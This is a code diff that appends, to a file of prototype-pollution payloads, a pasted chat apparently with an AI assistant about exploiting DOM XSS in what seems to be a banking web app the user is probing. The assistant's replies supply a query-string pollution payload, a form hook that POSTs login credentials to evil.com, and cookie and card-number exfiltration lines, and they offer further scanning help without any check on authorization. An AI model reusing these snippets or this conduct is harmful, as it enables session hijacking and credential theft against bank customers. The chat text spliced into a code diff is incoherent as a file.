@@ -28,3 +28,274 @@ document.body.innerHTML = "<div>" + {}.XSS + "</div>";
 Object.prototype.isAdmin = true;
 Object.prototype.role = "superuser";
 { "__proto__": { "XSS": "<script>alert('silent')</script>" } }
+
+
+Yes, this image shows a DOM-based XSS (Cross-Site Scripting) vulnerability triggered via Prototype Pollution.
+
+Breakdown of the Exploit:
+
+1. Prototype Pollution:
+
+Object.prototype.innerHTML is being modified.
+
+The payload '<img src=x onerror=alert(1)>' is injected into the DOM using document.write({}.innerHTML);.
+
+
+
+2. DOM-Based XSS:
+
+When document.write({}.innerHTML); executes, the polluted prototype causes the payload to be rendered as part of the DOM, triggering the onerror event and resulting in an alert.
+
+
+
+3. 403 Errors:
+
+The 403 Forbidden responses from the /referencedata/x endpoints suggest you’re probing unauthorized or protected endpoints—likely not directly related to the XSS but may hint at endpoint enumeration.
+
+
+
+
+Security Implication:
+
+This shows a critical security issue where the JavaScript environment can be manipulated to insert and execute arbitrary scripts via DOM operations—a textbook example of prototype pollution leading to DOM-based XSS.
+
+Recommendation:
+
+Sanitize user inputs thoroughly.
+
+Avoid using document.write(), especially with dynamic or untrusted data.
+
+Use deep clones and strict object schemas to avoid prototype chain pollution.
+
+
+
+1. Exploitation Flow:
+
+Step 1: Prototype Pollution
+
+The attacker somehow injects a payload that sets Object.prototype.innerHTML (or similar DOM-affecting property):
+
+Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';
+
+This might happen via:
+
+A vulnerable merge/deep copy function (_.merge, $.extend, etc.)
+
+A JSON-based config or query param that gets blindly applied to an object
+
+
+Step 2: DOM-Based Trigger
+
+Later in the code, something like this is used:
+
+document.write({}.innerHTML);
+
+Because {} inherits from Object.prototype, the polluted innerHTML gets used and rendered.
+
+
+---
+
+2. What the Attacker Gains
+
+a. JavaScript Execution (XSS)
+
+The attacker now runs arbitrary JS in the victim’s browser—this is the big win.
+
+b. Possible Consequences
+
+Session hijacking (steal cookies or tokens)
+
+Defacement (manipulate DOM)
+
+Credential theft (phishing forms)
+
+Keylogging (inject script to track user input)
+
+Pivot attacks (if internal APIs or admin panels are exposed)
+
+Wormable XSS (self-replicating payloads across users)
+
+
+
+---
+
+3. Real-World Attack Scenario
+
+Let’s say the app uses query parameters to build objects:
+
+example.com?__proto__[innerHTML]=<img src=x onerror=alert(1)>
+
+This could pollute the prototype globally, and if some page later uses:
+
+document.write({}.innerHTML);
+
+Boom—XSS.
+
+
+---
+
+4. Persistence & Scope
+
+This affects all objects created afterward—making it dangerous.
+
+May persist across components or users if prototype pollution occurs in shared state (e.g., frontend store or service worker).
+
+Ah, got it—you’re asking:
+
+> “Do banking web apps store sensitive data like card details in JavaScript objects (e.g., in memory on the client-side)?”
+
+
+
+The Realistic Answer:
+
+1. Best Practice:
+
+Secure banking apps should not store card details or sensitive data (like CVV, PIN, etc.) in JavaScript-accessible objects. Instead, they should:
+
+Immediately send the card data over a secure HTTPS POST.
+
+Avoid keeping it in memory longer than necessary.
+
+Never write it to the DOM or logs.
+
+Use tokenization (replace card numbers with temporary tokens).
+
+
+2. But In Practice...
+
+Sometimes card details do get stored temporarily in JavaScript objects, like:
+
+let paymentDetails = {
+  cardNumber: "4111 1111 1111 1111",
+  expiry: "12/27",
+  cvv: "123"
+};
+
+Especially in:
+
+Poorly coded or legacy systems
+
+Third-party payment pages (if not PCI-DSS compliant)
+
+SPAs that handle validation on the client side
+
+
+This is dangerous because:
+
+JS objects are easily readable via console.log, browser dev tools
+
+If there’s XSS, the attacker can extract this data silently
+
+
+3. How an Attacker Could Abuse It:
+
+If a site stores card data like this:
+
+window.formData = {
+  card: "1234 5678 9101 1121",
+  cvv: "999"
+};
+
+An attacker with DOM XSS or access via browser malware could just run:
+
+console.log(window.formData.card);
+
+Or exfiltrate:
+
+fetch("https://evil.com/steal?data=" + encodeURIComponent(window.formData.card));
+
+
+---
+
+Conclusion:
+
+Yes, in some cases, banking or payment sites may temporarily store card info in JavaScript objects—but this is bad practice and a major security risk, especially if XSS or browser compromise is possible.
+
+Would you like to see how you could scan a page for such leaked sensitive data in JavaScript memory?
+
+Then if it's not stored what will the attacker gain from this vuln
+
+
+Excellent question—and one that gets to the core of threat modeling for XSS and prototype pollution.
+
+Even if the banking app doesn’t store card details in JS objects, an attacker exploiting this vuln can still gain a lot, depending on how the app works.
+
+
+---
+
+What an Attacker Can Still Gain from DOM-based XSS / Prototype Pollution:
+
+1. Credential Theft
+
+Intercept login forms before submission
+
+document.querySelector('form').addEventListener('submit', e => {
+    fetch('https://evil.com/creds', {
+        method: 'POST',
+        body: new URLSearchParams(new FormData(e.target))
+    });
+});
+
+
+2. Session Hijacking
+
+Steal auth tokens or session cookies (if not HttpOnly)
+
+fetch('https://evil.com/leak?cookie=' + document.cookie);
+
+
+3. Account Takeover Actions
+
+Trigger actions as the user (e.g., transfer funds, change email)
+
+If the app uses JWTs or tokens in memory (e.g., window.authToken), attacker can exfil them
+
+
+4. Real-Time Phishing
+
+Replace parts of the DOM to trick the user into re-entering card info or credentials
+
+
+5. Persistent Malware
+
+Inject keyloggers, screen recorders, or beacon trackers
+
+Exfiltrate typed text, mouse movements, etc.
+
+
+6. Internal Network Pivot (if inside a bank’s intranet)
+
+Use the browser as a pivot point to access internal services or APIs (e.g., bank admin portals, APIs)
+
+
+7. Reputation or Compliance Impact
+
+Even if no card data is stolen, any such vuln in a banking app can result in:
+
+Loss of customer trust
+
+PCI-DSS violations
+
+Legal/financial consequences
+
+
+
+---
+
+TL;DR:
+
+Even without card data, a DOM-based XSS through prototype pollution lets the attacker:
+
+Hijack sessions
+
+Steal credentials
+
+Impersonate users
+
+Do real-time phishing
+
+Trigger money-moving operations
+
+Implant persistent scripts
+
+
